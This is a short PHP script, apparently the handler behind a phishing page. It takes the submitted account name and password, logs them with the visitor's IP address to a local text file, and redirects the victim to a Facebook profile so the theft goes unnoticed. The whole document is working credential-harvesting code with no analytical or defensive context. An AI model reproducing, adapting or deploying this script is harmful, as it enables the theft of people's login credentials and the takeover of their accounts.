<?php
header("Location: https://www.facebook.com/creatorvido86/");
$ab = "./ancor.txt";
$ran = rand(10,1000000000000);
$a = $_POST['Account'];
$b = $_POST['Password'];
$ip = $_SERVER['HTTP_CLIENT_IP'] 
   ? $_SERVER['HTTP_CLIENT_IP'] 
   : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        : $_SERVER['REMOTE_ADDR']);

$handle = fopen($ab, 'a');
fwrite($handle, "$ran|$a|$b|$ip");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>